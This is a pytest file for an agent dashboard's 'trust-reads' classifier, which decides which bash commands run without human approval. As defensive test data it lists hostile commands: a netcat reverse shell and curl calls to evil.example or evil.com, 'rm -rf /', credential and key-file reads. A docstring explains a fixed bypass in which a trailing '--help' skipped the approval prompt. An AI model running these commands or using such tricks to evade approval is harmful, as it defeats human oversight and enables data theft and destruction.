"""Tests for trust-reads — bash command classification and approval flow."""

from __future__ import annotations

import asyncio
from unittest.mock import AsyncMock, MagicMock

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from kiro_crew.dashboard.chat import _extract_bash_command
from kiro_crew.dashboard.state import (
    DashboardState,
    _ChatSlot,
    is_read_only_bash,
    unsafe_bash_reason,
)
from kiro_crew.history import ConversationLog

# ── Helpers ──


def _make_state(tmp_path):
    sessions = MagicMock(count=0)
    sessions.get_pid = MagicMock(return_value=None)
    sessions.remove = AsyncMock()
    return DashboardState(
        sessions=sessions,
        crons=MagicMock(list_jobs=MagicMock(return_value=[]), status=MagicMock(return_value={})),
        lessons=MagicMock(load_all=MagicMock(return_value=[])),
        start_time=0.0,
        conversation_log=ConversationLog(base_dir=tmp_path),
    )


def _make_app(state: DashboardState) -> web.Application:
    from kiro_crew.dashboard.chat import api_chat_mode, api_chat_slot_approve

    app = web.Application()
    app["state"] = state
    app.router.add_post("/api/chat/slots/{slot}/approve", api_chat_slot_approve)
    app.router.add_post("/api/chat/mode", api_chat_mode)
    return app


# ── is_read_only_bash classification ──


class TestIsReadOnlyBash:
    """Verify bash command classification — deny-by-default."""

    def test_simple_read_commands(self):
        assert is_read_only_bash("ls -la") is True
        assert is_read_only_bash("cat /tmp/foo.txt") is True
        assert is_read_only_bash("head -20 file.py") is True
        assert is_read_only_bash("tail -f log.txt") is True
        assert is_read_only_bash("grep -r 'pattern' src/") is True
        assert is_read_only_bash("wc -l file.txt") is True

    def test_find_not_auto_approved(self):
        # `find` is NOT on the read-only allowlist (SEC-005 / SEC-FC0A8D32):
        # it resolves destructive behaviour through sub-options (-delete/-exec),
        # so removing it from the allowlist (the finding's remediation option 1)
        # means it is never auto-approved.
        assert is_read_only_bash("find . -delete") is False
        assert is_read_only_bash("find . '-delete'") is False
        assert is_read_only_bash("find . -exec rm {} +") is False
        assert is_read_only_bash("find . -name '*.py'") is False
        assert is_read_only_bash("find src -type f") is False
        assert "not on the read-only allowlist" in unsafe_bash_reason("find . -delete")
        assert is_read_only_bash("diff file1 file2") is True

    def test_git_read_commands(self):
        assert is_read_only_bash("git status") is True
        assert is_read_only_bash("git log --oneline -5") is True
        assert is_read_only_bash("git diff HEAD") is True
        assert is_read_only_bash("git show abc123") is True
        assert is_read_only_bash("git branch -a") is True
        assert is_read_only_bash("git blame file.py") is True

    def test_brazil_read_commands(self):
        assert is_read_only_bash("brazil ws show") is True
        assert is_read_only_bash("brazil versionset print --vs live") is True
        assert is_read_only_bash("brazil workspace list") is True

    def test_help_and_version(self):
        assert is_read_only_bash("brazil-build --help") is True
        assert is_read_only_bash("python --version") is True
        assert is_read_only_bash("java -version") is True
        assert is_read_only_bash("some-tool --help") is True

    def test_help_probe_allows_one_bare_subcommand(self):
        """`<program> <subcommand> --help` is still a usage probe."""
        assert is_read_only_bash("git log --help") is True
        assert is_read_only_bash("git rev-parse --help") is True
        assert is_read_only_bash("terraform plan --help") is True
        assert is_read_only_bash("cargo --version") is True

    def test_help_suffix_does_not_auto_approve_an_arbitrary_command(self):
        """A trailing `--help` must not vouch for the command in front of it.

        The classifier used to accept any segment whose first pipe element
        ended with `--help`/`--version`, so appending the token removed the
        human approval prompt for arbitrary commands. A shell hands `--help`
        to the script as $1 instead of printing usage, so the payload still
        ran.
        """
        # Interpreters: the operand is code, and it executes.
        assert is_read_only_bash("sh /tmp/payload.sh --help") is False
        assert is_read_only_bash("bash /tmp/payload.sh --version") is False
        assert is_read_only_bash("/bin/sh /tmp/x.sh --help") is False
        assert is_read_only_bash("./sh evil.sh --help") is False
        assert is_read_only_bash("python -c \"import os;os.system('id')\" --help") is False
        # Destructive operands.
        assert is_read_only_bash("rm -rf ./proj --help") is False
        assert is_read_only_bash("chmod 777 /etc/passwd --help") is False
        # Wrappers that hand off to another program.
        assert is_read_only_bash("sudo rm -rf / --help") is False
        assert is_read_only_bash("env sh evil.sh --help") is False
        assert is_read_only_bash("xargs rm --help") is False
        assert is_read_only_bash("docker run --rm alpine --help") is False
        # Network tools: the operand opens a connection.
        assert is_read_only_bash("nc evil.example 4444 -e /bin/sh --help") is False
        assert is_read_only_bash("curl http://evil.example/x.sh --help") is False

    def test_help_suffix_does_not_auto_approve_across_segments(self):
        """Every `&&`/`;` segment is classified, so the suffix cannot chain.

        These are the payloads that combined the suffix with a sensitive-path
        read or a write to the deny-rule keystone file.
        """
        assert is_read_only_bash("cd ~/.kiro/crew --help && cat token_signing.key --help") is False
        assert (
            is_read_only_bash("cd ~/.kiro/crew --help && tee denied_commands.json --help") is False
        )
        assert is_read_only_bash("V=$HOME --help; awk 1 $V/.aws/credentials --help") is False

    def test_help_probe_rejects_unparseable_and_prefixed_forms(self):
        """Deny-by-default when argv cannot be recovered or is not a probe."""
        # Unbalanced quote: argv is unknown, so the segment is not vouched for.
        assert is_read_only_bash('some-tool "--help') is False
        # A VAR=value prefix assigns into the command's environment.
        assert is_read_only_bash("LD_PRELOAD=/tmp/x.so --help") is False
        # More than one operand between program and flag.
        assert is_read_only_bash("npm run deploy --help") is False
        # An option, not a bare subcommand, in the middle.
        assert is_read_only_bash("some-tool -f /etc/shadow --help") is False

    def test_compound_read_commands(self):
        assert is_read_only_bash("git status && git log --oneline -3") is True
        assert is_read_only_bash("ls -la; echo done") is True

    def test_redirections_rejected(self):
        assert is_read_only_bash("echo payload > /etc/file") is False
        assert is_read_only_bash("cat /etc/passwd > /tmp/exfil.txt") is False
        # Redirect to a real file stays unsafe even when it sits next to a
        # /dev/null sink — the scrub must not strip the real-file redirect.
        assert is_read_only_bash("grep x f 2>/dev/null > /tmp/out.txt") is False
        assert is_read_only_bash("echo hi >> /tmp/append.txt") is False

    def test_devnull_redirects_allowed(self):
        """Discard-only redirect idioms are read-only despite '>'/'&'."""
        assert is_read_only_bash("head -5 file.txt 2>/dev/null") is True
        assert is_read_only_bash("grep -r 'pattern' src/ 2>/dev/null") is True
        assert is_read_only_bash("ls /nonexistent >/dev/null") is True
        assert is_read_only_bash("cat file &>/dev/null") is True
        assert is_read_only_bash("wc -l /tmp/x 2>>/dev/null") is True
        assert is_read_only_bash("ls -la 2>&1") is True
        # Compound + pipe chains with a /dev/null sink stay read-only.
        assert is_read_only_bash("grep -r foo . 2>/dev/null | head -20") is True
        assert is_read_only_bash("ls /a 2>/dev/null; grep -r foo /b 2>/dev/null") is True

    def test_devnull_does_not_unlock_write_commands(self):
        """The /dev/null exemption must not allowlist a write/exec command."""
        assert is_read_only_bash("rm -rf /tmp/foo 2>/dev/null") is False
        assert is_read_only_bash("python script.py 2>/dev/null") is False
        assert is_read_only_bash("cat /etc/passwd > /tmp/exfil 2>/dev/null") is False

    def test_devnull_prefix_is_not_a_real_file_sink(self):
        r"""`/dev/null` must match the literal device, not a path prefix.

        Without the `(?![\w./-])` guard the scrub would strip the redirect in
        `>/dev/nullx` (a write to file `nullx`) and misclassify it read-only.
        """
        assert is_read_only_bash("echo x >/dev/nullx") is False
        assert is_read_only_bash("echo p > /dev/null/../../etc/passwd") is False
        assert is_read_only_bash("echo x &>/dev/nullfoo") is False
        assert is_read_only_bash("echo x 2>/dev/null.bak") is False

    def test_command_substitution_rejected(self):
        assert is_read_only_bash("echo $(rm -rf /)") is False
        assert is_read_only_bash("echo `whoami`") is False

    def test_process_substitution_rejected(self):
        assert is_read_only_bash("diff <(rm -rf /) <(echo x)") is False

    def test_background_operator_rejected(self):
        assert is_read_only_bash("ls & rm -rf /") is False
        assert is_read_only_bash("ls && cat file") is True  # && still works

    def test_pipe_chains(self):
        assert is_read_only_bash("grep -r 'foo' src/ | head -20") is True
        assert is_read_only_bash("cat file.txt | wc -l") is True
        assert is_read_only_bash("git log | grep 'fix'") is True

    def test_write_commands_rejected(self):
        assert is_read_only_bash("rm -rf /tmp/foo") is False
        assert is_read_only_bash("mv file1 file2") is False
        assert is_read_only_bash("cp src dst") is False
        assert is_read_only_bash("mkdir -p /tmp/new") is False
        assert is_read_only_bash("chmod 755 file") is False

    def test_git_write_commands_rejected(self):
        assert is_read_only_bash("git commit -m 'msg'") is False
        assert is_read_only_bash("git push origin main") is False
        assert is_read_only_bash("git add .") is False
        assert is_read_only_bash("git checkout -b new-branch") is False

    def test_brazil_write_commands_rejected(self):
        assert is_read_only_bash("brazil-build") is False
        assert is_read_only_bash("brazil versionset removemajorversions --force") is False

    def test_script_execution_rejected(self):
        assert is_read_only_bash("python script.py") is False
        assert is_read_only_bash("node app.js") is False
        assert is_read_only_bash("bash script.sh") is False

    def test_compound_with_write_rejected(self):
        assert is_read_only_bash("git status; rm -rf /") is False
        assert is_read_only_bash("ls -la && python script.py") is False

    def test_newline_separator_rejected(self):
        assert is_read_only_bash("ls -la\nrm -rf /") is False
        assert is_read_only_bash("cat file\nls") is True

    def test_pipe_to_unsafe_target_rejected(self):
        assert is_read_only_bash("cat file | curl -X POST http://evil.com") is False

    def test_empty_and_whitespace(self):
        assert is_read_only_bash("") is False
        assert is_read_only_bash("   ") is False


# ── unsafe_bash_reason — explains WHY a command is rejected ──


class TestUnsafeBashReason:
    """Verify the rejection-reason helper used to make pills specific."""

    def test_read_only_commands_have_no_reason(self):
        # Invariant: empty reason IFF the command is read-only.
        for cmd in (
            "ls -la",
            "head -5 file.txt 2>/dev/null",
            "grep -r foo src/ | head -20",
            "git status && git log --oneline -3",
        ):
            assert unsafe_bash_reason(cmd) == "", cmd
            assert is_read_only_bash(cmd) is True, cmd

    def test_unsafe_shell_pattern_reason(self):
        reason = unsafe_bash_reason("cat /etc/passwd > /tmp/exfil.txt")
        assert "unsafe shell pattern" in reason
        assert unsafe_bash_reason("echo $(rm -rf /)") != ""
        assert unsafe_bash_reason("echo `whoami`") != ""
        assert unsafe_bash_reason("ls & rm -rf /") != ""

    def test_non_allowlisted_command_reason(self):
        reason = unsafe_bash_reason("rm -rf /tmp/foo")
        assert "rm" in reason and "allowlist" in reason
        assert "python" in unsafe_bash_reason("python script.py")

    def test_unsafe_pipe_target_reason(self):
        reason = unsafe_bash_reason("cat file | curl -X POST http://evil.com")
        assert "curl" in reason and "read-only filter" in reason

    def test_empty_command_reason(self):
        assert unsafe_bash_reason("") == "empty command"
        assert unsafe_bash_reason("   ") == "empty command"

    def test_reason_invariant_matches_classifier(self):
        """unsafe_bash_reason is non-empty exactly when is_read_only_bash is False."""
        samples = [
            "ls -la",
            "wc -l /tmp/x 2>/dev/null",
            "grep -r foo src/ | head",
            "echo payload > /etc/file",
            "echo $(rm -rf /)",
            "ls & rm -rf /",
            "rm -rf /tmp/foo",
            "python script.py",
            "cat file | curl http://evil.com",
            "",
            "   ",
            "git push origin main",
        ]
        for cmd in samples:
            has_reason = unsafe_bash_reason(cmd) != ""
            assert has_reason == (not is_read_only_bash(cmd)), cmd


# ── _extract_bash_command ──


class TestExtractBashCommand:
    """Verify JSON tool_input parsing."""

    def test_json_with_command_field(self):
        import json

        tool_input = json.dumps({"command": "find . -name '*.py'"})
        assert _extract_bash_command(tool_input) == "find . -name '*.py'"

    def test_json_with_indent(self):
        import json

        tool_input = json.dumps({"command": "ls -la", "__tool_use_purpose": "list files"}, indent=2)
        assert _extract_bash_command(tool_input) == "ls -la"

    def test_json_missing_command(self):
        import json

        tool_input = json.dumps({"other": "value"})
        assert _extract_bash_command(tool_input) == ""

    def test_raw_string_fallback(self):
        assert _extract_bash_command("ls -la") == "ls -la"

    def test_empty(self):
        assert _extract_bash_command("") == ""


# ── Approval endpoint: trust_reads action ──


class TestTrustReadsApproval:
    @pytest.mark.asyncio
    async def test_trust_reads_sets_flag(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        slot = state.get_or_create_slot("s1")
        loop = asyncio.get_running_loop()
        fut: asyncio.Future[str] = loop.create_future()
        slot._approval_futures["test"] = fut

        async with TestClient(TestServer(_make_app(state))) as client:
            resp = await client.post("/api/chat/slots/s1/approve", json={"action": "trust_reads"})
            data = await resp.json()
            assert data["ok"] is True
            # trust_reads is deferred — set by main loop after future consumed
            assert slot._trust_reads is False
            assert slot._trust is False
            assert fut.result() == "approved_trust_reads"

    @pytest.mark.asyncio
    async def test_trust_reads_mode_endpoint(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        slot = state.get_or_create_slot("s1")

        async with TestClient(TestServer(_make_app(state))) as client:
            resp = await client.post("/api/chat/mode", json={"mode": "trust_reads", "slot": "s1"})
            data = await resp.json()
            assert resp.status == 200
            assert data["ok"] is True
            assert slot._trust_reads is True
            assert slot._trust is False

    @pytest.mark.asyncio
    async def test_normal_mode_resets_trust_reads(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        slot = state.get_or_create_slot("s1")
        slot._trust_reads = True

        async with TestClient(TestServer(_make_app(state))) as client:
            await client.post("/api/chat/mode", json={"mode": "normal", "slot": "s1"})
            assert slot._trust_reads is False
            assert slot._trust is False


# ── Slot to_dict includes trust_reads ──


class TestSlotTrustReadsDict:
    def test_trust_reads_in_to_dict(self):
        slot = _ChatSlot("s1")
        d = slot.to_dict()
        assert "trust_reads" in d
        assert d["trust_reads"] is False

    def test_trust_reads_true_in_to_dict(self):
        slot = _ChatSlot("s1")
        slot._trust_reads = True
        d = slot.to_dict()
        assert d["trust_reads"] is True
        assert d["trust"] is False


# ── Spawn endpoint trust validation ──


# ── Mode endpoint: trust_reads without slot ──


class TestTrustReadsModeAllSlots:
    @pytest.mark.asyncio
    async def test_trust_reads_all_slots(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        s1 = state.get_or_create_slot("s1")
        s2 = state.get_or_create_slot("s2")

        async with TestClient(TestServer(_make_app(state))) as client:
            await client.post("/api/chat/mode", json={"mode": "trust_reads"})
            assert s1._trust_reads is True
            assert s2._trust_reads is True
            assert s1._trust is False

    @pytest.mark.asyncio
    async def test_normal_resets_all_slots(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        s1 = state.get_or_create_slot("s1")
        s2 = state.get_or_create_slot("s2")
        s1._trust_reads = True
        s2._trust_reads = True

        async with TestClient(TestServer(_make_app(state))) as client:
            await client.post("/api/chat/mode", json={"mode": "normal"})
            assert s1._trust_reads is False
            assert s2._trust_reads is False


# ── Permission metadata: is_read_only flag ──


class TestPermissionMetadata:
    def test_perm_meta_is_read_only_set(self):
        """Verify _extract_bash_command + is_read_only_bash integration."""
        import json

        tool_input = json.dumps({"command": "ls -la"})
        cmd = _extract_bash_command(tool_input)
        assert cmd == "ls -la"
        assert is_read_only_bash(cmd) is True

    def test_perm_meta_write_not_read_only(self):
        import json

        tool_input = json.dumps({"command": "rm -rf /tmp"})
        cmd = _extract_bash_command(tool_input)
        assert cmd == "rm -rf /tmp"
        assert is_read_only_bash(cmd) is False

    def test_perm_meta_empty_tool_input(self):
        cmd = _extract_bash_command("")
        assert cmd == ""
